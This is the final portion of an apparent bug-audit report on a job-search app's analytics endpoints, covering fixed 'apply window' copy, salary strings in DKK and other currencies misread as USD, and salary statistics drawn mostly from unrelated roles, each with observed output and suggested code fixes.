- "Ideal apply window" copy is static ("Apply within 24-48 hours of posting for best results") — not derived from data, but presented as if it is.

#### Suggested fix
Two-pronged:

**1. Exclude seed-run windows via `scan_log`:**
```python
# api/v1/intelligence.py timing_intelligence()
# Find recent large scan runs (seed-import style):
big_runs = await db.execute(text("""
    SELECT started_at, completed_at FROM scan_log
    WHERE completed_at IS NOT NULL
      AND jobs_ingested > 1000
      AND started_at >= NOW() - INTERVAL '90 days'
"""))
exclusion_windows = [(r[0], r[1]) for r in big_runs]
# ...then when counting posting_by_day, exclude jobs whose first_seen_at falls in any window.
```

**2. Guard the recommendation copy:** don't show `best_day` unless the top day is at least 1.3× the second-best (otherwise say "No clear pattern yet"). For the "ideal apply window" blurb, either tie it to actual interview-rate data or remove the copy — users treat confident-sounding product copy as data-backed.

#### Cleanup
Read-only probe.

---

### 66. Salary parser defaults all non-GBP/EUR currencies to USD → DKK salaries appear at the top of "Top Paying"
**Severity:** 🟡 MEDIUM · **Area:** Intelligence / Salary

#### What I saw
```
GET /api/v1/intelligence/salary
top_paying[0] = {
  company: "Pandektes",
  raw:     "DKK 780000 - 960000",
  currency: "USD",                // ← wrong
  mid:     870000,                // ← read as $870k
  title:   "Senior Backend Engineer",
  role_cluster: ""
}
top_paying[1..2] = both Haldren Group with raw "USD 750000 - 980000" → likely scrape artefact
```

780,000 DKK ≈ $112,000 USD · 960,000 DKK ≈ $138,000 USD. The Intelligence dashboard surfaces this as "$870,000 USD" and places it at the top of the "top paying" list — an 8× over-report.

Source (`api/v1/intelligence.py` lines 158-163):
```python
currency = "USD"
if "£" in s or "gbp" in s:
    currency = "GBP"
elif "€" in s or "eur" in s:
    currency = "EUR"
# everything else (DKK, SEK, NOK, CAD, AUD, NZD, SGD, HKD, JPY, INR, ZAR) → USD
```
No conversion to USD; whatever number appears in the string is treated as dollars in the aggregations.

#### Why it matters
- A Senior Backend Engineer at a Danish company shown as earning $870K → distorts the perceived market rate.
- The `overall.avg=$135,740` is inflated by the same bug across many rows (a handful of 6-figure DKK/SEK rows skew the mean).
- Users make salary-negotiation decisions based on this page.

#### Suggested fix
Step 1 — detect the currency:
```python
CURRENCY_TOKENS = {
    "GBP": ("£", "gbp", "pound"),
    "EUR": ("€", "eur"),
    "DKK": ("dkk", "krone"),
    "SEK": ("sek", "kr"),
    "NOK": ("nok",),
    "CAD": ("cad", "c$"),
    "AUD": ("aud", "a$"),
    "NZD": ("nzd",),
    "SGD": ("sgd", "s$"),
    "HKD": ("hkd", "hk$"),
    "JPY": ("jpy", "¥", "yen"),
    "INR": ("inr", "₹", "rupee"),
    "ZAR": ("zar", "r"),
}
currency = "USD"
for code, tokens in CURRENCY_TOKENS.items():
    if any(tok in s for tok in tokens):
        currency = code
        break
```

Step 2 — convert, or bucket separately:
```python
# Option A: convert to USD at parse time using a committed FX table
FX_TO_USD = {"USD":1.0, "GBP":1.27, "EUR":1.08, "DKK":0.145, "SEK":0.095, …}
mid_usd = int(mid * FX_TO_USD.get(currency, 1.0))

# Option B: keep native currency; exclude non-USD from the default "top paying" ranking
if currency != "USD" and not include_all_currencies:
    continue
```

For the `"USD 750000 - 980000"` Haldren rows — those are a scrape artefact. An upstream data-validation step should reject any salary > $600K/year for non-C-suite titles (or flag for manual review).

#### Cleanup
Read-only probe.

---

### 67. Salary insights default to all-jobs aggregation (95% `role_cluster="other"`) instead of relevant-jobs
**Severity:** 🔵 LOW · **Area:** Intelligence / Salary

#### What I saw
```
GET /api/v1/intelligence/salary
by_cluster:
  other:    875   // ← 95 %
  infra:     22
  security:  10
  qa:        10
overall.count: 917
```
Over 95% of the data behind the "overall" stats is from jobs outside the user's target role clusters.

Source query (`api/v1/intelligence.py` line 202-205):
```python
query = select(Job.salary_range, Job.role_cluster, Job.geography_bucket, Job.title, Company.name).join(
    Company, Job.company_id == Company.id
).where(Job.salary_range != "", Job.salary_range.isnot(None))
# no relevance_score filter; no role_cluster filter unless caller passes one
```

The frontend (`IntelligencePage.tsx`) calls this endpoint without any filter, so the returned numbers are "all jobs with a salary listed", not "jobs the user would actually apply to".

#### Why it matters
The Intelligence page is framed as "salary insights for your target roles". The stats displayed conflict with that framing — they're actually global DB averages dominated by unrelated roles (sales, marketing, finance, HR — none of which are in the infra/security/qa clusters).

#### Suggested fix
Pick one:

**(a) Backend default:**
```python
# In salary_insights(), change the base query:
query = select(...).where(
    Job.salary_range != "",
    Job.relevance_score > 0,   # ← add
)
```
Add an opt-out param `?include_other=true` for admin/debug views.

**(b) Frontend always filters:**
```ts
// IntelligencePage.tsx
const { data } = useQuery(['salary', cluster], () =>
  fetch(`/api/v1/intelligence/salary?role_cluster=${cluster || 'infra'}`).then(r => r.json())
);
```
But this pushes scope to every caller; backend default is cleaner.

#### Cleanup
Read-only probe.

---

**End of report.**
